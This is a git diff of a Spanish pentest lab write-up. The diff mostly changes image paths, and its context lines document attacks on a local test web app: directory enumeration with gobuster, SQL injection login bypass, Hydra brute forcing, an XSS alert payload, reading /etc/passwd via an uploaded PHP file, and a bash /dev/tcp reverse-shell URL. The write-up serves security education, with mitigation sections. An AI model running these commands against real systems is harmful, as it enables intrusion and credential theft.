@@ -156,8 +156,8 @@ El primer paso es utilizar herramientas semiautomáticas como **Burp Suite**, **
 Se realizó un escaneo automatizado con **Burp Suite / Vega** para identificar de manera masiva las vulnerabilidades presentes en la aplicación.
 
 
-[VegaScan](/assets/images/headers/vega.png)
-[BurpSuite](/assets/images/headers/burp.png)
+[VegaScan](/assets/images/posts/atrium-desarrollo/vega.png)
+[BurpSuite](/assets/images/posts/atrium-desarrollo/burp.png)
 
 
 El resultado del escaneo muestra la cantidad y el tipo de vulnerabilidades encontradas (Aproximado), clasificadas por su nivel de riesgo:
@@ -187,7 +187,7 @@ Antes de la explotación, se utilizó **Gobuster** para enumerar directorios y a
 - **Comando 1**: `sudo gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://localhost:8080 -t 20 --add-slash`         
 - **Comando 2 (en el directorio /admin/)**: `sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://localhost:8888/admin/ -t 20 -x php,txt,html,php.bak,bak,tar`       
 
-[Gobuster](/assets/images/headers/gobuster.png)
+[Gobuster](/assets/images/posts/atrium-desarrollo/gobuster.png)
 
 
 Los resultados mostraron la existencia de archivos como `index.php`, `login.php`, y `home.php` en el directorio `/admin/`. Además, se observó que `home.php` redirige a `/admin/index.php?page=login`.
@@ -245,7 +245,7 @@ Ejemplo de creación de usuario con **Vega**:
 
 
 
-[Creacion User Vega](/assets/images/headers/vega_user.png)
+[Creacion User Vega](/assets/images/posts/atrium-desarrollo/vega_user.png)
 
 
 
@@ -257,7 +257,7 @@ En `http://localhost:8888/users/login.php` se inyecta el siguiente payload:
 
 Esto provoca un error de sintaxis, pero evidencia que el sistema evalúa la consulta SQL sin filtrar correctamente:
 
-[User panel](/assets/images/headers/usertest.png)
+[User panel](/assets/images/posts/atrium-desarrollo/usertest.png)
 
 Posteriormente, se prueba el usuario creado con la inyección:
 
@@ -269,7 +269,7 @@ Consulta resultante:
 
 Captura del login exitoso:
 
-[User Login](/assets/images/headers/userlogin.png)
+[User Login](/assets/images/posts/atrium-desarrollo/userlogin.png)
 
 
 ##### 5. Fuerza Bruta de Usuarios
@@ -283,10 +283,10 @@ Se utilizó **Burp Suite - Intruder** para realizar fuerza bruta sobre los usuar
     - bob        
 
 Captura del proceso en Burp Suite:  
-[User Login](/assets/images/headers/burpuser.png)
+[User Login](/assets/images/posts/atrium-desarrollo/burpuser.png)
 
 Comparación de acceso al panel:  
-[scanner1 Login](/assets/images/headers/scanner1login.png)
+[scanner1 Login](/assets/images/posts/atrium-desarrollo/scanner1login.png)
 
 
 ##### 6. Enumeración de Usuarios
@@ -296,10 +296,10 @@ Se realizó enumeración de usuarios mediante:
 `http://localhost:8888/users/view.php?userid=1`
 
 Modificando el parámetro `userid` se obtienen diferentes usuarios: 
-[scanner1 Login](/assets/images/headers/scanner2.png)
+[scanner1 Login](/assets/images/posts/atrium-desarrollo/scanner2.png)
 
 Fuerza bruta en usuarios obtenidos, logrando comprometer sus credenciales:  
-[BruteForce User](/assets/images/headers/userbrute.png)
+[BruteForce User](/assets/images/posts/atrium-desarrollo/userbrute.png)
 
 
 ##### **Mitigación y Recomendaciones de SQL Injection**
@@ -352,7 +352,7 @@ Se utilizó Hydra para comprobar credenciales del usuario _bryce_:
 - `-V` → verbose, muestra cada intento.
     
 
-[BruteForce User](/assets/images/headers/hydrabryce.png)
+[BruteForce User](/assets/images/posts/atrium-desarrollo/hydrabryce.png)
 
 La captura muestra cómo Hydra detecta intentos fallidos según el mensaje de error devuelto por la aplicación.
 
@@ -366,7 +366,7 @@ El panel de administración **no muestra un mensaje de error claro** para logins
 **Confirmación en BurpSuite:**  
 La longitud del contenido siempre es **266 bytes** ante un login fallido, lo que permite usar Hydra con condición de longitud:
 
-[BruteForce User](/assets/images/headers/burprespon.png)
+[BruteForce User](/assets/images/posts/atrium-desarrollo/burprespon.png)
 
 **Comando Hydra usando longitud de respuesta:**
 
@@ -385,7 +385,7 @@ La longitud del contenido siempre es **266 bytes** ante un login fallido, lo que
 - `S=Username` → Patrón de contenido para fallo, más estable que longitud.    
 - `-V` → Modo verbose.    
 
-[BruteForce User](/assets/images/headers/hydrabryce.png)
+[BruteForce User](/assets/images/posts/atrium-desarrollo/hydrabryce.png)
 
 Esta captura muestra el proceso de fuerza bruta en consola y cómo Hydra detecta logins correctos a partir de la condición de fallo definida.
 
@@ -430,7 +430,7 @@ Durante la evaluación se identificó una vulnerabilidad de **XSS reflejado** en
 
 `<script>alert("XSS")</script>`
 
-[XSS Alert](/assets/images/headers/xssalert1.png)
+[XSS Alert](/assets/images/posts/atrium-desarrollo/xssalert1.png)
 
 Al ejecutar este _payload_, se confirmó la ejecución de código JavaScript en el navegador de la víctima, evidenciando la falta de saneamiento de entradas.
 
@@ -514,8 +514,8 @@ La vulnerabilidad fue descubierta al subir una imagen cuyo contenido fue modific
 **Ejemplo de prueba de ejecución:**
 
 - Comando para ver `/etc/passwd`:  
-- [CMD codigo](/assets/images/headers/cmdphp.png)
-- [Cat /etc/passwd](/assets/images/headers/catetc.png)
+- [CMD codigo](/assets/images/posts/atrium-desarrollo/cmdphp.png)
+- [Cat /etc/passwd](/assets/images/posts/atrium-desarrollo/catetc.png)
     
 
 
@@ -574,13 +574,13 @@ localhost:8888/upload/shell1.php/shell.php?cmd=bash%20-i%20>%26%20/dev/tcp/192.1
 ```
 
 - **Captura de reverse shell interactiva** mostrando IP y usuario `www-data`:     
-[RevShell](/assets/images/headers/shellrev.png)
+[RevShell](/assets/images/posts/atrium-desarrollo/shellrev.png)
     
 - Recursos de pruebas adicionales: [Revshells](https://www.revshells.com/)    
 - Varias pruebas con payloads de bash y PHP, usando rutas y comandos URL codificados.    
 
 Contenido del arhcivo PHP subido para entablar conexion:
-[Code php Reverse](/assets/images/headers/phpcoderever.png)
+[Code php Reverse](/assets/images/posts/atrium-desarrollo/phpcoderever.png)
 
 ###### **4. Recomendaciones y Mitigaciones**
 
